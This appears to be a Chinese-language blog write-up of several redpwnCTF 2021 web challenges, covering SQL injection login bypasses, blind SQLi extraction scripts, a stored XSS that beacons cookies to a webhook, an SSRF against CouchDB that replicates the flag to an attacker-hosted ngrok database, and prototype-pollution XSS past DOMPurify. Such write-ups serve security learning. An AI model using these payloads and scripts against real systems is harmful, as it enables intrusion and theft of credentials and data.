[{"categories":["CTF"],"contents":"官方的docker地址~~复现一本满足~https://github.com/redpwn/redpwnctf-2021-challenges\nweb/inspect-me  See if you can find the flag in the source code!\ninspect-me.mc.ax\n web/orm-bad  I just learned about orms today! They seem kinda difficult to implement though\u0026hellip; Guess I\u0026rsquo;ll stick to good old raw sql statements!\norm-bad.mc.ax\nDownloads - app.js\n 万能密码：admin\u0026rsquo;or'1 : admin\n关于orm 之后要补一下知识：Object–relational mapping ORM 实例教程\nweb/secure  Just learned about encryption—now, my website is unhackable!\nsecure.mc.ax\nDownloads - index.js\n 还是个登录框，尝试万能密码\n源码是这样的\nconst crypto = require(\u0026#39;crypto\u0026#39;); const express = require(\u0026#39;express\u0026#39;); const db = require(\u0026#39;better-sqlite3\u0026#39;)(\u0026#39;db.sqlite3\u0026#39;); db.exec(`DROP TABLE IF EXISTS users;`); db.exec(`CREATE TABLE users( id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, password TEXT );`); db.exec(`INSERT INTO users (username, password) VALUES ( \u0026#39;${btoa(\u0026#39;admin\u0026#39;)}\u0026#39;, \u0026#39;${btoa(crypto.randomUUID)}\u0026#39; )`); const app = express(); app.use( require(\u0026#39;body-parser\u0026#39;).urlencoded({ extended: false, }) ); app.post(\u0026#39;/login\u0026#39;, (req, res) =\u0026gt; { if (!req.body.username || !req.body.password) return res.redirect(\u0026#39;/?message=Username and password required!\u0026#39;); const query = `SELECT id FROM users WHERE username = \u0026#39;${req.body.username}\u0026#39; AND password = \u0026#39;${req.body.password}\u0026#39;;`; try { const id = db.prepare(query).get()?.id; if (id) return res.redirect(`/?message=${process.env.FLAG}`); else throw new Error(\u0026#39;Incorrect login\u0026#39;); } catch { return res.redirect( `/?message=Incorrect username or password. Query: ${query}` ); } }); 他这个b64加密是发生在前端的，也就是在发包的时候就已经对post的数据进行了预处理，而具体到后端进行sql语句的查询时会直接拼接req.body.username/passwd的数据，不会进行进一步的检查或过滤\n刚开始想复杂了\nweb/cool  Aaron has a message for the cool kids. For support, DM BrownieInMotion.\ncool.mc.ax\nDownloads - app.py\n 登录框，可以注册 先尝试test: test 登录成功但是无法获取信息（注册后也会跳转这个页面\n留意cookie部分，是熟悉的flask session，扔进工具里解密\n再参考源码中的/message部分，考虑将session设为{\u0026ldquo;username\u0026rdquo;:\u0026ldquo;ginkoid\u0026rdquo;}后登入查看信息（开始以为是session伪造 后来发现不是）\n看一下其他部分的源码，首先是init()\ndef init(): # this is terrible but who cares execute(\u0026#39;\u0026#39;\u0026#39; CREATE TABLE IF NOT EXISTS users ( username TEXT PRIMARY KEY, password TEXT ); \u0026#39;\u0026#39;\u0026#39;) execute(\u0026#39;DROP TABLE users;\u0026#39;) execute(\u0026#39;\u0026#39;\u0026#39; CREATE TABLE users ( username TEXT PRIMARY KEY, password TEXT ); \u0026#39;\u0026#39;\u0026#39;) # put ginkoid into db ginkoid_password = generate_token() execute( \u0026#39;INSERT OR IGNORE INTO users (username, password)\u0026#39; f\u0026#39;VALUES (\\\u0026#39;ginkoid\\\u0026#39;, \\\u0026#39;{ginkoid_password}\\\u0026#39;);\u0026#39; ) execute( f\u0026#39;UPDATE users SET password=\\\u0026#39;{ginkoid_password}\\\u0026#39;\u0026#39; f\u0026#39;WHERE username=\\\u0026#39;ginkoid\\\u0026#39;;\u0026#39; ) 然后是在创建用户create_user()和登录check_login()时都会检测用户名中是否有非法字符（白名单是26个英文字母大小写和数字），算是挺严格的\ndef create_user(username, password): if any(c not in allowed_characters for c in username): return (False, \u0026#39;Alphanumeric usernames only, please.\u0026#39;) if len(username) \u0026lt; 1: return (False, \u0026#39;Username is too short.\u0026#39;) if len(password) \u0026gt; 50: return (False, \u0026#39;Password is too long.\u0026#39;) other_users = execute( f\u0026#39;SELECT * FROM users WHERE username=\\\u0026#39;{username}\\\u0026#39;;\u0026#39; ) if len(other_users) \u0026gt; 0: return (False, \u0026#39;Username taken.\u0026#39;) execute( \u0026#39;INSERT INTO users (username, password)\u0026#39; f\u0026#39;VALUES (\\\u0026#39;{username}\\\u0026#39;, \\\u0026#39;{password}\\\u0026#39;);\u0026#39; # passwd部分可控 ) return (True, \u0026#39;\u0026#39;) 考虑了一下二次注入，因为注册时的passwd部分完全可控，设想是这样的\n构造passwd部分为 '),('ginkoid','passwd\nemmmm 但是这里不管是明文还是url encode都会有500错误，而且这里返回的时correct_password[0][0]==password，也算是杜绝了这种多添加一条信息的可能，之前已经初始化的密码会是[0][0]，而新插入的passwd将是[1][0]；并且在init()时定义username是primary 也不可能有重复的\n————比赛的时候就停到这里了，也是当时了解的太少，思路很容易就断掉了。。。以下是复现\n在看了这篇wp之后，发现这位师傅最开始跟我的思路是一样的 都想利用insert那一句，都想替换掉数据库中原来存有的ginkoid的密码；这位师傅用的payload是\n'),('ginkoid','') ON CONFLICT DO UPDATE SET password='';-- 其中的ON CONFLICT DO UPDATE SET，在这篇官方文档里写的很详细，这位师傅给的payload很好（我当时则对这个sql语句并不清楚）但是正如他所说的，which is 8 characters over the limit, which won\u0026rsquo;t do.\n最后使用盲注的方式，先上一下脚本 （这里是来源）再说说思路\nimport time import requests url = \u0026#34;https://cool.mc.ax/\u0026#34; # url = \u0026#34;http://127.0.0.1:5000/\u0026#34; prefix = \u0026#34;asdfjwfoijweoijfojiewfj\u0026#34; charset = \u0026#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789\u0026#34; val = \u0026#34;\u0026#34; for i in range(32): username = prefix + str(time.time_ns()).replace(\u0026#34;0\u0026#34;, \u0026#34;\u0026#34;)\t# 注意白名单里没有0 要换掉 password = f\u0026#34;\u0026#39;||(select substr(password,{i+1},1) from users)||\u0026#39;\u0026#34; resp = requests.post(url + \u0026#34;register\u0026#34;, data={\u0026#34;username\u0026#34;: username, \u0026#34;password\u0026#34;: password}).text for c in charset: resp = requests.post(url, data={\u0026#34;username\u0026#34;: username, \u0026#34;password\u0026#34;: c}).text if \u0026#34;Incorrect\u0026#34; not in resp: print(c) val += c break print(val) 注入点仍然是上文提到的/register路由中create_user(username,password)（当时找对了注入点，但是盲注这块还是做的少）\n主要的payload是\npassword = f\u0026#34;\u0026#39;||(select substr(password,{i+1},1) from users)||\u0026#39;\u0026#34; 这一句，当进入到注册流程时 会执行\nexcute(\u0026#39;INSERT INTO users (username, password)\u0026#39; f\u0026#39;VALUES (\\\u0026#39;{username}\\\u0026#39;, \\\u0026#39;{password}\\\u0026#39;);\u0026#39;) 即\nexcute(\u0026#39;INSERT INTO users(username, password)\u0026#39; values (\u0026#39;xxxxusernamexxxx\u0026#39;, \u0026#39;\u0026#39;||(select substr(password,n,1) from users)||\u0026#39;\u0026#39;)) 其中||连接两个不同的字符串，得到一个新的字符串；所以发送注册请求时password的值就是后面的查询语句select substr(password,n,1) from users，而查询语句返回的是substr(password,n,1) 是ginkoid这个账户的密码的其中一位，要获得这个值具体是什么 需要再有一个for in _ in charset遍历，在登录处 把这个值给试出来\n英文版讲解：The SELECT statement will take the character at index in ginkoid\u0026rsquo;s password, and concatenate it with \u0026lsquo;\u0026rsquo;, to be used as the new user\u0026rsquo;s password. We can then try logging in as our new user with every character in allowed_characters as the password. If we login successfully, then we know that we guessed the character correctly. Repeating this for all 32 characters gives us our password.\n获得密码后以ginkoid的账号登录，会得到一个mp3文件，但是并不是什么所谓的隐写 flag就在抓包后可以看到\n————其实还是有一点点疑问，为什么select substr(password,n,1) from users就能确保是ginoid的passwd呢？ginkoid是表中的第一条数据，在新建表后立刻插入，这就可以保证在查询的时候只查ginkoid的密码吗？\ndiscord之前有人问过这个问题，当时的解答是这是sqllite的特性，但是用sqllite在线工具尝试后发现也不是这样的 也会返回所有数据的substr(x,x,x)的值，但是确实是用这样的payload能做出来\n————后来想了一下 是这里的return correct_password[0][0]==password 确保了虽然sql查询语句返回的是很多个单一字母，但是是多行返回，仍然只会取到第一个；再加上username是主键 第一个插入，所以这个payload是可以的以一个事后诸葛亮的角度来看return correct_password[0][0]==password 这句代码 其实有暗示的成分在了\n————还有另一版的脚本 discord里收的import asyncio import random import aiohttp allowed = \u0026#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789\u0026#39; url = \u0026#39;\u0026lt;https://cool.mc.ax/\u0026gt;\u0026#39; n = 32 final = dict() async def try_pass(sem, username, password, index): params = { \u0026#39;username\u0026#39;: username, \u0026#39;password\u0026#39;: password, } async with sem: async with aiohttp.ClientSession() as session: async with session.post(url, data=params) as resp: result = await resp.text() if \u0026#39;Incorrect\u0026#39; not in result: print(f\u0026#39;password[{index}]: {password}\u0026#39;) final[index] = password async def get_char(sem, index): # random username since otherwise we error username = \u0026#39;\u0026#39;.join(random.choices(allowed, k=32)) payload = f\u0026#34;\u0026#39;||(SELECT substr(password,{index+1},1) FROM users)||\u0026#39;\u0026#34; assert(len(payload) \u0026lt;= 50) params = { \u0026#39;username\u0026#39;: username, \u0026#39;password\u0026#39;: payload, } async with sem: async with aiohttp.ClientSession() as session: await session.post(url + \u0026#39;register\u0026#39;, data=params) tasks = [] for c in allowed: tasks.append(try_pass(sem, username, c, index)) await asyncio.gather(*tasks) async def main(): # without this we get an OSError due to too many open file descriptors sem = asyncio.Semaphore(300) index_tasks = [] for i in range(n): index_tasks.append(get_char(sem, i)) await asyncio.gather(*index_tasks) password = \u0026#39;\u0026#39; for i in range(len(final)): password += final[i] print(f\u0026#34;Password: {password}\u0026#34;) asyncio.run(main()) web/notes  Texting things to yourself, but online! notes.mc.ax\nPlease put a reasonably secure password when making an account\nReport problems here.\nDownloads - notes.tar.gz\n 先看页面 是个登录框，先填用户名和密码再点login或register，尝试test: test登入，界面是一个可以加notes 自定body和tag的app在view notes看到已经有人试过xss了，这里有个小小的越权漏洞，/view/+username直接可以看到其他的师傅在尝试什么样的payload（看了wp以后才意识到这里的tag部分就是注入点 而当时的我以为是卡bug了简单审了下源码，也没啥特别的，首先初始化一个admin号，flag在admin的private分类的notes中；对于个人发的notes会转义body部分为html实体来预防xss\n但是这个notes-app的形式是妥妥的xss了，那突破口在哪里捏？其实是被忽略的tag部分！一般情况下看到tag可选private/public就会不关注这里，但是配合特殊的DOM解析 这里无疑是注入点！下面简单分析一下，参考wp\n从/static/view.html中我们可以看到这个notes-app的前端渲染所凭借的模板长啥样\nbody部分被完全的保护了，但是tag没有过滤 只是限制了个数\n我们利用的就是浏览器解析html的部分，可以让不相关的几个notes拼接在一起（举个简单的栗子：在一个note里面用\u0026lt;p\u0026gt; 另一个里面放\u0026lt;/p\u0026gt;，中间的部分会被放在一起）这里选用的是\u0026lt;style\u0026gt;这个tag，利用它onload的属性\n还有一个待解决的问题是上下两个notes之间会有\u0026lt;div class=\u0026quot;card\u0026quot;\u0026gt;的存在；这也是不用\u0026lt;iframe\u0026gt;和它的onload属性的原因，因为浏览器是不允许\u0026lt;iframe\u0026gt;中属性换行的\n我们最终的payload\nbody: anything tag: \u0026lt;style a=' body: anything tag: 'onload='` body: `;eval(somecode)/* tag: */'\u0026gt; 然后是常规的xss\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script\u0026gt; window.open(\u0026#34;https://notes.mc.ax/view/\u0026lt;username\u0026gt;\u0026#34;, \u0026#34;navigator.sendBeacon(\u0026#39;\u0026lt;webhook server\u0026gt;\u0026#39;, document.cookie)\u0026#34;); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; web/Requester  Java is the future. Strictly typed, extremeley secure, and the most modern frameworks all come together to make an unhackable service. - Nobody 2021\nrequester.mc.ax\nDownloads - requester-release.zip\n java可以说是完全不懂，比赛的时候就简单看了下就溜了，参考 解法1 - _replicator 解法2 - _find\n一个简单的java-app，检测给出的api是否正常 并且返回一个json\n给了docker\n先用jd-gui打开jar包看看源码\n先看Main.class\npublic class Main { public static Database db; public static String flag; public static void main(String[] args) { String adminUser = System.getenv(\u0026#34;adminUser\u0026#34;); String adminPassword = System.getenv(\u0026#34;adminPassword\u0026#34;); flag = System.getenv(\u0026#34;flag\u0026#34;); String javalinEnv = System.getenv(\u0026#34;javalinEnv\u0026#34;); db = new Database(adminUser, adminPassword); db.initializeDatabase(); JavalinJte.configure(createTemplateEngine(javalinEnv)); Javalin app = Javalin.create().start(8080); app.get(\u0026#34;/\u0026#34;, ctx -\u0026gt; ctx.render(\u0026#34;index.jte\u0026#34;)); app.get(\u0026#34;/createUser\u0026#34;, Handlers::createUser); app.get(\u0026#34;/testAPI\u0026#34;, Handlers::testAPI); } } 做一些初始化的工作，取出admin的用户名和密码以及flag的值，新建一个database，分出3个路由；\n先看database.class（分析的比较详细 之前做java很少\nprivate final String adminUsername; private final String adminPassword; public Database(String adminUsername, String adminPassword) { this.adminUsername = adminUsername; this.adminPassword = adminPassword; } private String getDbString() { return \u0026#34;http://\u0026#34; + this.adminUsername + \u0026#34;:\u0026#34; + this.adminPassword + \u0026#34;@couchdb:5984/\u0026#34;; } private boolean validateAlphanumeric(String name) { return name.matches(\u0026#34;^[a-zA-Z0-9_]*$\u0026#34;); } 存储从main.class里接收到的adminUsername\u0026amp;adminPassword；getDbString()返回一个可以用来连接couchdb数据库的url\npublic void createDatabase(String name) throws Exception { if (name.length() \u0026gt; 16 || !validateAlphanumeric(name)) throw new Exception(\u0026#34;Illegal name\u0026#34;); JSONObject res = HttpClient.putAPI(getDbString() + getDbString(), \u0026#34;\u0026#34;); if (!res.has(\u0026#34;ok\u0026#34;) || !res.getBoolean(\u0026#34;ok\u0026#34;)) throw new Exception(\u0026#34;Database creation failed\u0026#34;); } public void initializeDatabase() { try { createDatabase(\u0026#34;_replicator\u0026#34;); } catch (Exception e) { Utils.logException(e); System.out.println(\u0026#34;Replicator already initialized\u0026#34;); } try { createDatabase(\u0026#34;_users\u0026#34;); } catch (Exception e) { Utils.logException(e); System.out.println(\u0026#34;Users already initialized\u0026#34;); } try { createDatabase(\u0026#34;log\u0026#34;); } catch (Exception e) { Utils.logException(e); System.out.println(\u0026#34;Log already initialized\u0026#34;); } } 通过向构造好的url发送http请求来创建数据库，有三个默认的库：_replicator, _users, log\npublic void createUser(String name, String password) throws Exception { if (name.length() \u0026gt; 16 || !validateAlphanumeric(name)) throw new Exception(\u0026#34;Illegal name\u0026#34;); if (password.length() \u0026gt; 16 || !validateAlphanumeric(password)) throw new Exception(\u0026#34;Illegal password\u0026#34;); // ... boring java stuff  JSONObject res = HttpClient.putAPI(getDbString() + \u0026#34;_users/org.couchdb.user:\u0026#34; + getDbString(), userObj.toString()); // ... boring java stuff  } public void addUserToDatabase(String dbName, String username) throws Exception { if (dbName.length() \u0026gt; 16 || !validateAlphanumeric(dbName)) throw new Exception(\u0026#34;Illegal dbname\u0026#34;); if (username.length() \u0026gt; 16 || !validateAlphanumeric(username)) throw new Exception(\u0026#34;Illegal username\u0026#34;); // ... boring java stuff  JSONObject res = HttpClient.putAPI(getDbString() + getDbString() + \u0026#34;/_security\u0026#34;, configObj.toString()); // ... boring java stuff  } public void insertDocumentToDatabase(String dbName, String document) throws Exception { // ... boring java stuff  JSONObject res = HttpClient.postAPI(getDbString() + getDbString(), document); // ... boring java stuff  } 这部分是创建用户并插入数据库中 并且插入一个文件，欸 用的也是http发请求这一招 这不就可控了？\n这里就完了，转去看Handlers.class\npublic static void createUser(Context ctx) { String username = (String)ctx.queryParam(\u0026#34;username\u0026#34;, String.class).get(); String password = (String)ctx.queryParam(\u0026#34;password\u0026#34;, String.class).get(); try { Main.db.createDatabase(username); Main.db.createUser(username, password); Main.db.addUserToDatabase(username, username); JSONObject flagDoc = new JSONObject(); flagDoc.put(\u0026#34;flag\u0026#34;, Main.flag); Main.db.insertDocumentToDatabase(username, flagDoc.toString()); ctx.result(\u0026#34;success\u0026#34;); } catch (Exception e) { throw new InternalServerErrorResponse(\u0026#34;Something went wrong\u0026#34;); } } 当发出一个请求 带着username和passwd时，它会调用createUser()创建一条用户的数据存入库中，并且存一个flagDoc；接着看最后一个testAPI\npublic static void testAPI(Context ctx) { String url = (String)ctx.queryParam(\u0026#34;url\u0026#34;, String.class).get(); String method = (String)ctx.queryParam(\u0026#34;method\u0026#34;, String.class).get(); String data = ctx.queryParam(\u0026#34;data\u0026#34;); try { URL urlURI = new URL(url); if (urlURI.getHost().contains(\u0026#34;couchdb\u0026#34;)) throw new ForbiddenResponse(\u0026#34;Illegal!\u0026#34;); } catch (MalformedURLException e) { throw new BadRequestResponse(\u0026#34;Input URL is malformed\u0026#34;); } try { if (method.equals(\u0026#34;GET\u0026#34;)) { JSONObject jsonObj = HttpClient.getAPI(url); String str = jsonObj.toString(); } else if (method.equals(\u0026#34;POST\u0026#34;)) { JSONObject jsonObj = HttpClient.postAPI(url, data); String stringJsonObj = jsonObj.toString(); if (Utils.containsFlag(stringJsonObj)) throw new ForbiddenResponse(\u0026#34;Illegal!\u0026#34;); } else { throw new BadRequestResponse(\u0026#34;Request method is not accepted\u0026#34;); } } catch (Exception e) { throw new InternalServerErrorResponse(\u0026#34;Something went wrong\u0026#34;); } ctx.result(\u0026#34;success\u0026#34;); } 对给出的url（通过url参数进行提交）进行get或者post，先检查if (urlURI.getHost().contains(\u0026quot;couchdb\u0026quot;))，如果为真直接报错；之后发出请求 如果Utils.containsFlag(stringJsonObj)为真也会报错出去\n源码算是看完了，接下来想想解题的方法（有部分关于ssrf的前置知识可以看这篇鼻祖ppt - A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages! - 🍊Orange Tsai）\n本地先起一个环境，run on localhost:8080，\n$ curl localhost:8080/testAPI?url=https://couchdb:5984/\\\u0026amp;method=GET Illegal! 由之前的代码分析我们知道因为couchdb的存在所以illegal，但是不太重要（反正终会被绕过）先创建一个用户\n$ curl http://localhost:8080/createUser?username=neptunian\\\u0026amp;password=neptunian # Creating user success $ curl -s http://neptunian:neptunian@couchdb:5984/neptunian/_all_docs | jq # Listing \u0026#34;neptunian\u0026#34; database documents, using our credentials (jq formats our JSON output) { \u0026#34;total_rows\u0026#34;: 1, \u0026#34;offset\u0026#34;: 0, \u0026#34;rows\u0026#34;: [ { \u0026#34;id\u0026#34;: \u0026#34;99ea668366ac9d5d74fd2bc91c00ed5b\u0026#34;, \u0026#34;key\u0026#34;: \u0026#34;99ea668366ac9d5d74fd2bc91c00ed5b\u0026#34;, \u0026#34;value\u0026#34;: { \u0026#34;rev\u0026#34;: \u0026#34;1-cee1919fc2eda9a6068ed2792608a9dd\u0026#34; } } ] } $ curl -s http://neptunian:neptunian@couchdb:5984/neptunian/99ea668366ac9d5d74fd2bc91c00ed5b | jq # Check details of document id 99ea668366ac9d5d74fd2bc91c00ed5b { \u0026#34;_id\u0026#34;: \u0026#34;99ea668366ac9d5d74fd2bc91c00ed5b\u0026#34;, \u0026#34;_rev\u0026#34;: \u0026#34;1-cee1919fc2eda9a6068ed2792608a9dd\u0026#34;, \u0026#34;flag\u0026#34;: \u0026#34;flag{fake}\u0026#34; } 显然当我们新建一个用户时，我们的fake flag会被自动插入这个数据库中，并且直接curl是可以取出来的，但是题目是不能直接curl 需要缝合到限定的testAPI上，尝试构造一下~\n$ curl -vv http://localhost:8080/testAPI?method=GET\\\u0026amp;url=http://neptunian:neptunian\\@couchdb\\:5984\\@couchdb\\:5984/neptunian ... success 这样构造的url并不会触发filter，但是由于仅仅返回success而没有更多的信息，为了验证是不是触及到了couchdb server，我们可以尝试插入一个自定义的doc，这里用py脚本传\nimport requests import json headers = { \u0026#39;Accept\u0026#39;: \u0026#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\u0026#39; } # Simple POST Test params = ( (\u0026#39;url\u0026#39;, \u0026#39;http://neptunian:neptunian@couchdb:5984@couchdb:5984/neptunian\u0026#39;), (\u0026#39;method\u0026#39;, \u0026#39;POST\u0026#39;), (\u0026#39;data\u0026#39;, json.dumps({ \u0026#34;some_int\u0026#34;: 1, \u0026#34;some_string\u0026#34;: \u0026#34;c\u0026#34; }) ) ) # Local response = requests.get(\u0026#39;http://localhost:8080/testAPI\u0026#39;, headers=headers, params=params) print(response.text) $ curl -s http://neptunian:neptunian@couchdb:5984/neptunian/_all_docs | jq { \u0026#34;total_rows\u0026#34;: 2, \u0026#34;offset\u0026#34;: 0, \u0026#34;rows\u0026#34;: [ { \u0026#34;id\u0026#34;: \u0026#34;99ea668366ac9d5d74fd2bc91c00ed5b\u0026#34;, \u0026#34;key\u0026#34;: \u0026#34;99ea668366ac9d5d74fd2bc91c00ed5b\u0026#34;, \u0026#34;value\u0026#34;: { \u0026#34;rev\u0026#34;: \u0026#34;1-cee1919fc2eda9a6068ed2792608a9dd\u0026#34; } }, { \u0026#34;id\u0026#34;: \u0026#34;99ea668366ac9d5d74fd2bc91c00fd09\u0026#34;, \u0026#34;key\u0026#34;: \u0026#34;99ea668366ac9d5d74fd2bc91c00fd09\u0026#34;, \u0026#34;value\u0026#34;: { \u0026#34;rev\u0026#34;: \u0026#34;1-f8744c7d9e172ac4b188fbb8f337a204\u0026#34; } } ] } # There is a new ID 99ea668366ac9d5d74fd2bc91c00fd09! $ curl -s http://neptunian:neptunian@couchdb:5984/neptunian/99ea668366ac9d5d74fd2bc91c00fd09 | jq { \u0026#34;_id\u0026#34;: \u0026#34;99ea668366ac9d5d74fd2bc91c00fd09\u0026#34;, \u0026#34;_rev\u0026#34;: \u0026#34;1-f8744c7d9e172ac4b188fbb8f337a204\u0026#34;, \u0026#34;some_int\u0026#34;: 1, \u0026#34;some_string\u0026#34;: \u0026#34;c\u0026#34; } 足以证明我们自己构造的带testAPI的缝合怪是可以正常执行couchdb相关的增删查改功能的\n而重要的是远程也能打通，这里有这么个好东西https://docs.couchdb.org/en/3.1.1/replication/replicator.html，我们只需要构造一组post数据就可以远程得到一份数据！\n{ \u0026#34;source\u0026#34;: \u0026#34;source_db_name\u0026#34;, \u0026#34;target\u0026#34;: \u0026#34;http://dest_user:dest_password@destination_host/dest_database\u0026#34; } 至于做法就很简单了：先用ngrok搞一个网上可访问的couchdb，得到临时的url https://2d0a4710580a.ngrok.io，先创建数据库来便于接收之后复制的数据\n$ curl -X PUT https://tempadm:tempadm12@2d0a4710580a.ngrok.io/neptunian_flag {\u0026#34;ok\u0026#34;:true} 然后就可以利用replicator和精心构造的json数据大搞特搞了！先本地\nimport requests import json headers = { \u0026#39;Accept\u0026#39;: \u0026#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\u0026#39; } # POST Replication params = ( (\u0026#39;url\u0026#39;, \u0026#39;http://neptunian:neptunian@couchdb:5984@couchdb:5984/_replicate\u0026#39;), (\u0026#39;method\u0026#39;, \u0026#39;POST\u0026#39;), (\u0026#39;data\u0026#39;, json.dumps({ \u0026#34;source\u0026#34;: \u0026#34;neptunian\u0026#34;, \u0026#34;target\u0026#34;: \u0026#34;https://tempadm:tempadm12@2d0a4710580a.ngrok.io/neptunian_flag\u0026#34; }) ) ) # response = requests.get(\u0026#39;http://localhost:8080/testAPI\u0026#39;, headers=headers, params=params) response = requests.get(\u0026#39;https://requester.mc.ax/testAPI\u0026#39;, headers=headers, params=params) print(response.text) $ curl -s http://tempadm:tempadm12@couchdb:5984/flagdb/_all_docs | jq { \u0026#34;total_rows\u0026#34;: 1, \u0026#34;offset\u0026#34;: 0, \u0026#34;rows\u0026#34;: [ { \u0026#34;id\u0026#34;: \u0026#34;d139bf6ab1733d779f64e9c6c4026de9\u0026#34;, \u0026#34;key\u0026#34;: \u0026#34;d139bf6ab1733d779f64e9c6c4026de9\u0026#34;, \u0026#34;value\u0026#34;: { \u0026#34;rev\u0026#34;: \u0026#34;1-4bb8f6dafef84b2d856fe1444f38b0a2\u0026#34; } } ] } $ curl -s http://tempadm:tempadm12@couchdb:5984/flagdb/d139bf6ab1733d779f64e9c6c4026de9 | jq { \u0026#34;_id\u0026#34;: \u0026#34;d139bf6ab1733d779f64e9c6c4026de9\u0026#34;, \u0026#34;_rev\u0026#34;: \u0026#34;1-4bb8f6dafef84b2d856fe1444f38b0a2\u0026#34;, \u0026#34;flag\u0026#34;: \u0026#34;flag{JaVA_tHE_GrEAteST_WeB_lANguAge_32154}\u0026#34; } 好耶！复制怪好耶！\n虽然上面说了这么多，其实核心思路也挺清晰的，就是先认真分析源码 找出漏洞点是用couchdb创建用户时会自动插入flag 这个过程是使用http请求 我们很容易就可以构造一个url创建用户 让flag进入自己掌控的数据库中，之后就可以顺畅的进行数据库的增删查改；但是这还需要接上题目中给出的testAPI入口才行，又经过一些构造可以成功缝合；但是由于鸡贼的设置 testAPI处的请求只会返回成功或失败，为了确切的得到flag，我们利用了couchdb的_replicator这个好东西来进行一个数据的复制，得到flag~~~\n————以下是第二种解法: char-by-char-blind-sqli\n源码的分析不变，这是根本，差异之处首先在于构造url时这里利用了couchdb的另一个好东西_find\ncurl -X POST -H \u0026#34;Content-Type: application/json\u0026#34; \u0026#39;http://strellicsquad:12345@couchdb:5984/strellicsquad/_find\u0026#39; --data \u0026#39;{\u0026#34;selector\u0026#34;:{\u0026#34;flag\u0026#34;: {\u0026#34;$regex\u0026#34;: \u0026#34;.*\u0026#34;}}}\u0026#39; 本地测试可以成功会显出flag；第二个差异在缝合testAPI的时候，由于filter对于大小写不太敏感，所以大写Couch来绕过了；同样面临回显只有成功或失败 但是char-by-char-blind-sqli无所畏惧~\nimport urllib.parse import requests import json import string # first, make a request to # /createUser?username=strellicsquad\u0026amp;password=12345 alphabet = \u0026#34;etoanihsrdlucgwyfmpbkvjxqz{}_01234567890ETOANIHSRDLUCGWYFMPBKVJXQZ\u0026#34; def test_regex(regex): url = \u0026#34;http://strellicsquad:12345@Couchdb:5984/strellicsquad/_find\u0026#34; data = json.dumps({\u0026#34;selector\u0026#34;:{\u0026#34;flag\u0026#34;: {\u0026#34;$regex\u0026#34;: regex}}}) r = requests.get(f\u0026#34;https://requester.mc.ax/testAPI/?url={urllib.parse.quote(url)}\u0026amp;method=POST\u0026amp;data={urllib.parse.quote(data)}\u0026#34;) return \u0026#34;Something went wrong\u0026#34; in r.text flag = \u0026#34;flag{\u0026#34; while not flag.endswith(\u0026#34;}\u0026#34;): for c in alphabet: check = \u0026#34;^\u0026#34; + flag + c + \u0026#34;.*\u0026#34; if test_regex(check): print(f\u0026#34;found {c}-\u0026gt; {flag}{c}\u0026#34;) flag += c break 也可以拿flag~~ flag{JaVA_tHE_GrEAteST_WeB_lANguAge_32154}\n————最悲催的莫过于之后我也用docker在本地起了一个环境 但是初始化有问题，导致localhost:5984无法访问\n我搜了一下 有相关问题的解答 但都不明确……\n从这个报错看 应该是说题目相关的需要的database_does_not_exist，但是用于初始化的/_utils也无法访问，直接curl 127.0.0.1:5984也是失败，curl couchdb:5984也是失败，处理报错真是心累\nweb/requester-strikes-back  Java was found to not be the future. Can you take down requester again?\n 源码处有一处修改if (urlURI.getHost().toLowerCase().contains(\u0026quot;couchdb\u0026quot;))\n这使得我们不能用之前的Couchdb大写的方式来绕过，但是\n结合Incorrect handling of malformed authority component by URIUtils#extractHost\n我们只需要把之前的url改成http://strellicsquad:12345@couchdb:5984@pepegaclapwr/strellicsquad/_find即可（解法二）\n解法一直接跑就行 一样能通\n相关的一些ssrf前置知识\u0026amp;url解析问题仍然可以看这里：A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages! - 🍊Orange Tsai（好厉害的ppt）\n参考：wp1 wp2\nweb/pastebin-1  Ah, the classic pastebin.\npastebin-1.mc.ax\nAdmin bot\nDownloads - main.rs\n pastebin，类似留言板的样子 可以发表paste\n第一反应就是xss，试一下alert(1) 成功弹窗题目另外提供了一个/admin-bot页面，这个，妥妥的xss好吧 直接xss platform一把梭！\n***web/pastebin-2-social-edition  Pastebin, now with comments. Send cool stuff to the admin! If they like it, they might even leave you a note.\npastebin-2-social-edition.mc.ax\nAdmin bot\n 这次adminbot会给自己的paste下面留言回复\n显然啊 还是xss，但是用了DOMPurify，并且这个版本也很新 之前的一些bug也没法利用，参考wp\n看源码\n注意到这里，如果有错误 就会设置errorContainer.innerHTML = message;，如果我们能控制error message 就能做到xss了；这里利用原型污染prototype pollution，即使DOMPurify可以阻挡一些xss常用的标签或者属性，也阻止不了原型污染\n\u0026lt;form\u0026gt; \u0026lt;fieldset name=\u0026#34;__proto__\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;error\u0026#34; value=\u0026#34;1\u0026#34; /\u0026gt; \u0026lt;input name=\u0026#34;message\u0026#34; value=\u0026#34;\u0026lt;img src=x onerror=\u0026#39;alert(1)\u0026#39;\u0026gt;\u0026#34; /\u0026gt; \u0026lt;/fieldset\u0026gt; \u0026lt;input value=\u0026#34;Post Comment\u0026#34; type=\u0026#34;submit\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; 我们可以把error污染成任意值，message污染为xss内容和payload\n\u0026lt;form\u0026gt; \u0026lt;fieldset name=\u0026#34;__proto__\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;error\u0026#34; value=\u0026#34;1\u0026#34; /\u0026gt; \u0026lt;input name=\u0026#34;message\u0026#34; value=\u0026#34;\u0026lt;img src=x onerror=\u0026#39;alert(1)\u0026#39;\u0026gt;\u0026#34; /\u0026gt; \u0026lt;/fieldset\u0026gt; \u0026lt;input value=\u0026#34;Post Comment\u0026#34; type=\u0026#34;submit\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; {}[\u0026#34;__proto__\u0026#34;][\u0026#34;error\u0026#34;] = \u0026#34;1\u0026#34;; 